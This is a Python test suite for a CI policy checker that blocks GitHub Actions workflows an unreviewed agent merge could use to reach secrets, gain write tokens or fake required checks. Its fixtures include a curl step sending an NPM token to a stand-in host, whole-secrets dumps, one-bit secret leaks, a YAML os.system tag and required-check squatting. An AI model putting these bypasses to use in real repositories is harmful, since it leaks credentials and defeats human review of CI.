#!/usr/bin/env python3
"""Tests for the CI policy check.

Most tests are bypass attempts: an unprivileged workflow an agent could merge
without review, written to get a secret, a write token or a fake required
check past the checker. Each must be refused. The rest keep the checker from
refusing the ordinary read-only workflows this repo has dozens of, and run it
over the real tree.
"""

import tempfile
import textwrap
import unittest
from pathlib import Path

import ci_policy_check as cp

CHECKOUT = "actions/checkout@11d5960a326750d5838078e36cf38b85af677262"
FORK_RUNNER = "${{ github.event.pull_request.head.repo.fork && 'ubuntu-latest' || vars.CI_RUNNER || 'ubuntu-latest' }}"

POLICY = cp.Policy(
    actions={
        "actions/checkout": {"11d5960a326750d5838078e36cf38b85af677262"},
        "actions/cache": {"0057852bfaa89a56745cba8c7296529d2fc39830"},
        "actions/setup-python": {"a26af69be951a213d495a4c3e4e4022e16d87065"},
        "actions/setup-node": {"49933ea5288caeca8642d1e84afbd3f7d6820020"},
        "actions/download-artifact": {"d3f86a106a0bac45b974a628896c90dbdf5c8093"},
    },
    runner_labels={"ubuntu-latest", "macos-latest", "windows-latest"},
    runner_expressions={cp.norm_ws(FORK_RUNNER)},
    required_checks={"control-plane", "ci-policy", "conflict-markers"},
)

GOOD = f"""
name: Example
on:
  pull_request:
  push:
    branches: [main]
permissions:
  contents: read
jobs:
  test:
    runs-on: {FORK_RUNNER}
    steps:
      - uses: {CHECKOUT} # v4
        with:
          persist-credentials: false
      - run: python3 -m unittest
"""


def unpriv(text: str, priv_names=frozenset({"agent cross-review"})) -> list[str]:
    return cp.check_unprivileged(cp.load_yaml(textwrap.dedent(text)), POLICY, set(priv_names))


def with_job(extra_job_lines: str = "", top: str = "permissions:\n  contents: read\n", on: str = "on: [push]\n", steps: str = "") -> str:
    return (
        "name: Example\n" + on + top + "jobs:\n  test:\n    runs-on: ubuntu-latest\n"
        + textwrap.indent(textwrap.dedent(extra_job_lines), "    ")
        + "    steps:\n"
        + f"      - uses: {CHECKOUT}\n        with:\n          persist-credentials: false\n"
        + textwrap.indent(textwrap.dedent(steps), "      ")
    )


class Baseline(unittest.TestCase):
    def test_ordinary_read_only_workflow_passes(self):
        self.assertEqual(unpriv(GOOD), [])

    def test_job_level_permissions_override_missing_top_level(self):
        self.assertEqual(unpriv(with_job("permissions:\n  contents: read\n", top="")), [])

    def test_read_all_and_none_pass(self):
        self.assertEqual(unpriv(with_job(top="permissions: read-all\n")), [])
        self.assertEqual(unpriv(with_job(top="permissions: {}\n")), [])
        self.assertEqual(unpriv(with_job(top="permissions:\n  contents: read\n  id-token: none\n")), [])

    def test_github_token_is_allowed_under_read_only_permissions(self):
        self.assertEqual(unpriv(with_job(steps="- run: gh pr list\n  env:\n    GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n")), [])
        self.assertEqual(unpriv(with_job(steps="- run: gh pr list\n  env:\n    GH_TOKEN: ${{ github.token }}\n")), [])

    def test_word_secrets_in_a_shell_script_is_not_an_expression(self):
        self.assertEqual(unpriv(with_job(steps="- run: echo 'no secrets here' && grep -r secrets docs/\n")), [])

    def test_matrix_name_that_cannot_be_a_required_check_passes(self):
        job = "name: browser-checks (${{ matrix.check }})\nstrategy:\n  matrix:\n    check: ${{ fromJSON('[\"a\"]') }}\n"
        self.assertEqual(unpriv(with_job(job)), [])

    def test_github_hosted_matrix_runner_passes(self):
        text = with_job().replace("runs-on: ubuntu-latest", "runs-on: ${{ matrix.os }}\n    strategy:\n      matrix:\n        os: [ubuntu-latest, windows-latest]")
        self.assertEqual(unpriv(text), [])


class Permissions(unittest.TestCase):
    def assertRefused(self, text, fragment):
        errs = unpriv(text)
        self.assertTrue(any(fragment in e for e in errs), f"expected {fragment!r} in {errs}")

    def test_missing_permissions_defaults_to_repository_setting(self):
        self.assertRefused(with_job(top=""), "no `permissions` block")

    def test_write_all(self):
        self.assertRefused(with_job(top="permissions: write-all\n"), "write-all")

    def test_any_write_scope(self):
        self.assertRefused(with_job(top="permissions:\n  contents: write\n"), "contents: write")
        self.assertRefused(with_job(top="permissions:\n  contents: read\n  pull-requests: write\n"), "pull-requests: write")

    def test_job_level_write_overrides_read_top_level(self):
        self.assertRefused(with_job("permissions:\n  packages: write\n"), "packages: write")

    def test_id_token_write(self):
        self.assertRefused(with_job(top="permissions:\n  contents: read\n  id-token: write\n"), "id-token")

    def test_permissions_from_an_expression(self):
        self.assertRefused(with_job(top="permissions: ${{ 'write-all' }}\n"), "not read-only")

    def test_one_job_without_permissions_among_good_ones(self):
        text = with_job("permissions:\n  contents: read\n", top="") + "  other:\n    runs-on: ubuntu-latest\n    steps:\n      - run: true\n"
        self.assertRefused(text, "jobs.other: no `permissions` block")


class Secrets(unittest.TestCase):
    def assertRefused(self, text, fragment="reaches secrets"):
        errs = unpriv(text)
        self.assertTrue(any(fragment in e for e in errs), f"expected {fragment!r} in {errs}")

    def test_secret_in_step_env(self):
        self.assertRefused(with_job(steps="- run: curl -d \"$K\" https://evil.example\n  env:\n    K: ${{ secrets.NPM_TOKEN }}\n"))

    def test_secret_in_job_env(self):
        self.assertRefused(with_job("env:\n  K: ${{ secrets.PYPI_TOKEN }}\n"))

    def test_secret_in_workflow_env(self):
        self.assertRefused(with_job(top="permissions:\n  contents: read\nenv:\n  K: ${{ secrets.X }}\n"))

    def test_secret_inline_in_run(self):
        self.assertRefused(with_job(steps="- run: echo ${{ secrets.X }} | base64\n"))

    def test_secret_in_action_input(self):
        self.assertRefused(with_job(steps=f"- uses: {CHECKOUT}\n  with:\n    token: ${{{{ secrets.PAT }}}}\n    persist-credentials: false\n"))

    def test_bracket_index(self):
        self.assertRefused(with_job(steps="- run: echo ${{ secrets['NPM_TOKEN'] }}\n"))

    def test_bracket_index_of_github_token_is_still_refused(self):
        self.assertRefused(with_job(steps="- run: echo ${{ secrets['GITHUB_TOKEN'] }}\n"))

    def test_whole_context_via_tojson(self):
        self.assertRefused(with_job(steps="- run: echo '${{ toJSON(secrets) }}'\n"))

    def test_case_and_whitespace_variants(self):
        self.assertRefused(with_job(steps="- run: echo ${{ SECRETS.npm_token }}\n"))
        self.assertRefused(with_job(steps="- run: echo ${{secrets .NPM_TOKEN}}\n"))

    def test_secret_with_github_token_prefix(self):
        self.assertRefused(with_job(steps="- run: echo ${{ secrets.GITHUB_TOKEN_ADMIN }}\n"))

    def test_secret_in_if_without_braces(self):
        self.assertRefused(with_job("if: secrets.NPM_TOKEN != ''\n"))

    def test_secret_in_step_if(self):
        self.assertRefused(with_job(steps="- if: startsWith(secrets.NPM_TOKEN, 'npm_a')\n  run: echo leak-one-bit\n"))

    def test_secret_in_format_call(self):
        self.assertRefused(with_job(steps="- run: echo ${{ format('{0}', secrets.X) }}\n"))

    def test_secret_in_a_mapping_key(self):
        self.assertRefused(with_job(steps="- run: env\n  env:\n    ${{ secrets.X }}: y\n"))

    def test_secret_in_concurrency_or_name(self):
        self.assertRefused(with_job().replace("name: Example", "name: ${{ secrets.X }}"))

    def test_secrets_inherit(self):
        text = "on: [push]\npermissions:\n  contents: read\njobs:\n  call:\n    uses: ./.github/workflows/other.yml\n    secrets: inherit\n"
        self.assertRefused(text, "`secrets:` passes secrets")

    def test_explicit_secrets_map_to_reusable_workflow(self):
        text = "on: [push]\npermissions:\n  contents: read\njobs:\n  call:\n    uses: ./.github/workflows/other.yml\n    secrets:\n      token: ${{ secrets.NPM_TOKEN }}\n"
        errs = unpriv(text)
        self.assertTrue(any("`secrets:` passes" in e for e in errs))
        self.assertTrue(any("reaches secrets" in e for e in errs))

    def test_environment_exposes_environment_secrets(self):
        self.assertRefused(with_job("environment: publish\n"), "`environment:`")
        self.assertRefused(with_job("environment:\n  name: publish\n"), "`environment:`")

    def test_container_credentials_from_secrets(self):
        self.assertRefused(with_job("container:\n  image: ghcr.io/x/y\n  credentials:\n    username: u\n    password: ${{ secrets.GHCR }}\n"))


class Triggers(unittest.TestCase):
    def test_pull_request_target(self):
        self.assertTrue(any("pull_request_target" in e for e in unpriv(with_job(on="on: pull_request_target\n"))))
        self.assertTrue(any("pull_request_target" in e for e in unpriv(with_job(on="on:\n  pull_request_target:\n    types: [opened]\n"))))
        self.assertTrue(any("pull_request_target" in e for e in unpriv(with_job(on="on: [push, pull_request_target]\n"))))

    def test_workflow_run(self):
        self.assertTrue(any("workflow_run" in e for e in unpriv(with_job(on="on:\n  workflow_run:\n    workflows: [X]\n    types: [completed]\n"))))

    def test_quoted_on_key(self):
        self.assertTrue(any("pull_request_target" in e for e in unpriv(with_job(on='"on": pull_request_target\n'))))


class Reusable(unittest.TestCase):
    def call(self, target):
        return unpriv(f"on: [push]\npermissions:\n  contents: read\njobs:\n  call:\n    uses: {target}\n")

    def test_calling_a_priv_workflow(self):
        self.assertTrue(any("calls privileged workflow" in e for e in self.call("./.github/workflows/priv-distribute-npm.yml")))

    def test_calling_an_unprivileged_local_workflow_is_fine(self):
        self.assertEqual(self.call("./.github/workflows/shared-tests.yml"), [])

    def test_remote_reusable_workflow_unpinned_or_unlisted(self):
        self.assertTrue(self.call("evil/repo/.github/workflows/x.yml@main"))
        self.assertTrue(self.call("evil/repo/.github/workflows/x.yml@" + "a" * 40))


class Actions(unittest.TestCase):
    def step(self, uses):
        return unpriv(with_job(steps=f"- uses: {uses}\n"))

    def test_tag_pin_refused(self):
        self.assertTrue(any("full commit SHA" in e for e in self.step("actions/setup-node@v4")))

    def test_branch_pin_refused(self):
        self.assertTrue(self.step("actions/setup-node@main"))

    def test_short_sha_refused(self):
        self.assertTrue(self.step("actions/setup-node@49933ea"))

    def test_unlisted_action_refused(self):
        self.assertTrue(any("allowlist" in e for e in self.step("evil/exfil@" + "b" * 40)))

    def test_listed_action_at_unlisted_sha_refused(self):
        self.assertTrue(any("allowlist" in e for e in self.step("actions/setup-node@" + "c" * 40)))

    def test_lookalike_owner_refused(self):
        self.assertTrue(self.step("actions-/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020"))
        self.assertTrue(self.step("action/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020"))

    def test_subpath_of_listed_repo_at_listed_sha_passes(self):
        self.assertEqual(self.step("actions/cache/restore@0057852bfaa89a56745cba8c7296529d2fc39830"), [])

    def test_uses_from_expression_refused(self):
        self.assertTrue(any("expression" in e for e in self.step("${{ vars.ACTION }}")))

    def test_docker_image_refused(self):
        self.assertTrue(self.step("docker://alpine:latest"))

    def test_local_action_allowed(self):
        self.assertEqual(self.step("./platform/some-action"), [])

    def test_checkout_persisting_credentials(self):
        errs = unpriv(with_job(steps=f"- uses: {CHECKOUT}\n- run: git push origin HEAD:main\n"))
        self.assertTrue(any("persist-credentials" in e for e in errs))

    def test_checkout_persist_true_string(self):
        errs = unpriv(with_job(steps=f"- uses: {CHECKOUT}\n  with:\n    persist-credentials: 'true'\n"))
        self.assertTrue(any("persist-credentials" in e for e in errs))


class Runners(unittest.TestCase):
    def runs_on(self, value, extra=""):
        return unpriv(with_job().replace("runs-on: ubuntu-latest", f"runs-on: {value}{extra}"))

    def test_self_hosted_literal(self):
        self.assertTrue(any("self-hosted" in e for e in self.runs_on("self-hosted")))
        self.assertTrue(self.runs_on("[self-hosted, linux]"))

    def test_runner_group(self):
        self.assertTrue(self.runs_on("\n      group: big-runners"))

    def test_other_variable_expression(self):
        self.assertTrue(self.runs_on("${{ vars.OTHER_RUNNER || 'ubuntu-latest' }}"))

    def test_matrix_with_self_hosted_value(self):
        self.assertTrue(self.runs_on("${{ matrix.os }}", "\n    strategy:\n      matrix:\n        os: [ubuntu-latest]\n        include:\n          - os: self-hosted"))

    def test_owner_switch_expression_with_extra_whitespace_passes(self):
        self.assertEqual(self.runs_on(FORK_RUNNER.replace(" && ", "  &&  ")), [])


class Squatting(unittest.TestCase):
    def test_job_id_named_like_required_check(self):
        errs = unpriv(with_job().replace("  test:\n", "  control-plane:\n"))
        self.assertTrue(any("required status check 'control-plane'" in e for e in errs))

    def test_job_name_named_like_required_check(self):
        self.assertTrue(unpriv(with_job("name: ci-policy\n")))

    def test_job_name_from_expression(self):
        self.assertTrue(unpriv(with_job("name: ${{ 'ci-policy' }}\n")))
        self.assertTrue(unpriv(with_job("name: ci-${{ matrix.x }}\nstrategy:\n  matrix:\n    x: [policy]\n")))
        self.assertTrue(unpriv(with_job("name: ${{ inputs.n }}\n")))

    def test_workflow_name_copied_from_priv_workflow(self):
        errs = unpriv(with_job().replace("name: Example", "name: Agent Cross-Review"))
        self.assertTrue(any("copies a priv- workflow's name" in e for e in errs))


class Yaml(unittest.TestCase):
    def test_anchor_and_alias(self):
        text = with_job().replace("permissions:\n  contents: read\n", "permissions: &p\n  contents: read\n") + "  other:\n    runs-on: ubuntu-latest\n    permissions: *p\n    steps:\n      - run: true\n"
        with self.assertRaises(cp.PolicyError):
            cp.load_yaml(text)

    def test_merge_key(self):
        text = "base: &b\n  contents: read\npermissions:\n  <<: *b\n  contents: write\n"
        with self.assertRaises(cp.PolicyError):
            cp.load_yaml(text)

    def test_duplicate_key_last_wins_attack(self):
        text = "permissions:\n  contents: read\npermissions: write-all\n"
        with self.assertRaises(cp.PolicyError):
            cp.load_yaml(text)

    def test_duplicate_nested_key(self):
        with self.assertRaises(cp.PolicyError):
            cp.load_yaml("permissions:\n  contents: read\n  contents: write\n")

    def test_explicit_tag(self):
        with self.assertRaises(cp.PolicyError):
            cp.load_yaml("permissions: !!str write-all\n")
        with self.assertRaises(cp.PolicyError):
            cp.load_yaml("x: !!python/object:os.system ls\n")

    def test_unparseable(self):
        with self.assertRaises(cp.PolicyError):
            cp.load_yaml("on: [push\n")


class TreeFixture(unittest.TestCase):
    """check_all over a throwaway repo: the privileged-side rules."""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.root = Path(self.tmp.name)
        (self.root / ".github" / "workflows").mkdir(parents=True)
        (self.root / "scripts").mkdir()
        (self.root / "scripts" / "publish.mjs").write_text("import { x } from './helper.mjs';\n")
        (self.root / "scripts" / "helper.mjs").write_text("export const x = 1;\n")
        (self.root / "scripts" / "owned.py").write_text("import sibling\n")
        (self.root / "scripts" / "sibling.py").write_text("")
        (self.root / "app").mkdir()
        (self.root / "app" / "package.json").write_text("{}")
        self.codeowners = "/.github/workflows/priv-* @o\n/scripts/owned.py @o\n/scripts/sibling.py @o\n"

    def tearDown(self):
        self.tmp.cleanup()

    def run_all(self, files: dict[str, str], accepted=()):
        for name, text in files.items():
            (self.root / ".github" / "workflows" / name).write_text(textwrap.dedent(text))
        policy = cp.Policy(**{**POLICY.__dict__, "accepted": list(accepted)})
        rules = cp.guard.parse_codeowners(self.codeowners)
        return cp.check_all(self.root / ".github" / "workflows", policy, rules, self.root)

    PRIV = """
        name: Publish
        on: [push]
        permissions:
          contents: read
        jobs:
          publish:
            runs-on: ubuntu-latest
            environment: publish
            steps:
              - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262
                with:
                  persist-credentials: false
              - run: {run}
                env:
                  TOKEN: ${{{{ secrets.NPM_TOKEN }}}}
        """

    def test_privileged_job_running_unowned_script_and_its_import(self):
        res = self.run_all({"priv-publish.yml": self.PRIV.format(run="node scripts/publish.mjs")})
        errs = res["priv-publish.yml"]
        self.assertTrue(any("scripts/publish.mjs" in e for e in errs))
        self.assertTrue(any("scripts/helper.mjs" in e for e in errs), errs)

    def test_owned_script_and_owned_import_pass(self):
        res = self.run_all({"priv-publish.yml": self.PRIV.format(run="python3 scripts/owned.py")})
        self.assertEqual(res["priv-publish.yml"], [])

    def test_unowned_python_sibling_import_is_followed(self):
        self.codeowners = "/scripts/owned.py @o\n"
        res = self.run_all({"priv-publish.yml": self.PRIV.format(run="python3 scripts/owned.py")})
        self.assertTrue(any("scripts/sibling.py" in e for e in res["priv-publish.yml"]))

    def test_build_command_in_product_dir(self):
        text = self.PRIV.format(run="npm ci && npm run deploy").replace("- run:", "- working-directory: app\n                run:")
        res = self.run_all({"priv-publish.yml": text})
        self.assertTrue(any("app/package.json" in e for e in res["priv-publish.yml"]))
        res = self.run_all({"priv-publish.yml": text}, accepted=[{"workflow": "priv-publish.yml", "path": "app/", "why": "t"}])
        self.assertEqual(res["priv-publish.yml"], [])

    def test_accepted_entry_is_scoped_to_its_workflow(self):
        text = self.PRIV.format(run="npm ci").replace("- run:", "- working-directory: app\n                run:")
        res = self.run_all({"priv-publish.yml": text}, accepted=[{"workflow": "priv-other.yml", "path": "app/", "why": "t"}])
        self.assertTrue(res["priv-publish.yml"])

    def test_global_npm_install_is_not_a_build(self):
        res = self.run_all({"priv-publish.yml": self.PRIV.format(run="npm install --global wrangler@4.145.0")})
        self.assertEqual(res["priv-publish.yml"], [])

    def test_commented_out_script_is_ignored(self):
        res = self.run_all({"priv-publish.yml": self.PRIV.format(run="|\n                  # node scripts/publish.mjs\n                  true")})
        self.assertEqual(res["priv-publish.yml"], [])

    def test_cache_restore_in_privileged_job(self):
        text = self.PRIV.format(run="true").replace(
            "              - run:", "              - uses: actions/cache@0057852bfaa89a56745cba8c7296529d2fc39830\n                with:\n                  path: x\n                  key: k\n              - run:"
        )
        self.assertTrue(any("Actions cache" in e for e in self.run_all({"priv-publish.yml": text})["priv-publish.yml"]))

    def test_setup_python_pip_cache_in_privileged_job(self):
        text = self.PRIV.format(run="true").replace(
            "              - run:", "              - uses: actions/setup-python@a26af69be951a213d495a4c3e4e4022e16d87065\n                with:\n                  cache: pip\n              - run:"
        )
        self.assertTrue(any("pip cache" in e for e in self.run_all({"priv-publish.yml": text})["priv-publish.yml"]))

    def test_cross_run_artifact_in_privileged_job(self):
        text = self.PRIV.format(run="true").replace(
            "              - run:", "              - uses: actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093\n                with:\n                  run-id: ${{ github.event.workflow_run.id }}\n                  github-token: ${{ github.token }}\n              - run:"
        )
        self.assertTrue(any("another run's artifacts" in e for e in self.run_all({"priv-publish.yml": text})["priv-publish.yml"]))

    def test_priv_calling_unprivileged_reusable_workflow(self):
        text = "name: P\non: [push]\npermissions:\n  contents: read\njobs:\n  call:\n    uses: ./.github/workflows/helper.yml\n    secrets: inherit\n"
        res = self.run_all({"priv-p.yml": text, "helper.yml": "on: workflow_call\npermissions:\n  contents: read\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - run: true\n"})
        self.assertTrue(any("calls unprivileged workflow" in e for e in res["priv-p.yml"]))

    def test_workflow_run_following_unprivileged_workflow(self):
        text = "name: P\non:\n  workflow_run:\n    workflows: [Tests]\n    types: [completed]\npermissions:\n  contents: read\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - run: true\n"
        res = self.run_all({"priv-p.yml": text, "tests.yml": "name: Tests\n" + GOOD.split("\n", 2)[2]})
        self.assertTrue(any("workflow_run follows" in e for e in res["priv-p.yml"]))

    def test_unprivileged_workflow_squatting_priv_name(self):
        res = self.run_all({"priv-p.yml": self.PRIV.format(run="true"), "copy.yml": GOOD.replace("name: Example", "name: Publish")})
        self.assertTrue(any("copies a priv- workflow's name" in e for e in res["copy.yml"]))

    def test_required_check_job_must_run_owned_code(self):
        # No secrets, read-only: but it is the merge gate, so an agent edit
        # to the script it runs could make the required check always pass.
        text = GOOD.replace("  test:\n", "  ci-policy:\n").replace("python3 -m unittest", "node scripts/publish.mjs")
        res = self.run_all({"priv-gate.yml": text})
        self.assertTrue(any("scripts/publish.mjs" in e for e in res["priv-gate.yml"]), res["priv-gate.yml"])

    def test_yaml_extension_is_checked_too(self):
        res = self.run_all({"sneaky.yaml": GOOD.replace("contents: read", "contents: write")})
        self.assertTrue(res["sneaky.yaml"])


class RealTree(unittest.TestCase):
    """The repository as it stands must pass, or the required check is red."""

    def test_repository_passes(self):
        policy = cp.Policy.load()
        rules = cp.guard.parse_codeowners((cp.REPO_ROOT / ".github" / "CODEOWNERS").read_text(encoding="utf-8"))
        results = cp.check_all(cp.REPO_ROOT / ".github" / "workflows", policy, rules, cp.REPO_ROOT)
        failures = {k: v for k, v in results.items() if v}
        self.assertEqual(failures, {})

    def test_required_checks_come_from_the_ruleset(self):
        self.assertIn("ci-policy", cp.Policy.load().required_checks)
        self.assertIn("control-plane", cp.Policy.load().required_checks)

    def test_every_workflow_needing_secrets_or_write_is_priv(self):
        for f in cp.workflow_files(cp.REPO_ROOT / ".github" / "workflows"):
            if not f.name.startswith(cp.PRIV_PREFIX):
                doc = cp.load_yaml(f.read_text(encoding="utf-8"))
                self.assertEqual(cp.privileged_jobs(doc), {}, f.name)


if __name__ == "__main__":
    unittest.main()
